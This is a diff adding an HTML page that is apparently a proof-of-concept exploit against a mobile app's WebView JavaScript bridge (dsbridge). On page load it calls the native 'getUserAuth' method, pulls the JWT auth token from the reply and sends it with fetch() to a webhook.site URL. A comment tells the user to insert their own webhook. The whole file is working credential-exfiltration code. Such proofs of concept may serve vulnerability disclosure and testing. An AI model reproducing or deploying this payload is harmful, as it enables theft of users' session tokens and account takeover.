@@ -1,0 +1,29 @@
+<!doctype html>
+<meta charset="utf-8">
+
+<!-- load dsbridge -->
+<script src="https://cdn.jsdelivr.net/npm/dsbridge@3.1.4/dist/dsbridge.min.js"></script>
+
+<script>
+// change the webhook.site for your webhook.site
+function send(tok){
+  fetch("https://webhook.site/70cb4354-b573-4055-aa6f-aa7051037047?jwt_token="+encodeURIComponent(tok));
+}
+
+function unwrap(res){
+  if(typeof res==="string"){ try{ res=JSON.parse(res);}catch(e){} }
+  return res && res.data && res.data.authtoken;
+}
+
+// bridge ready and ask for token
+document.addEventListener("DOMContentLoaded",()=>{
+  const bridge = window.dsBridge || window._dsbridge;
+  if(!bridge || !bridge.call){ return; }
+
+// getUserAuth
+  bridge.call("getUserAuth", {}, function(resp){
+      const jwt = unwrap(resp);
+      if(jwt){ send(jwt); }
+  });
+});
+</script>
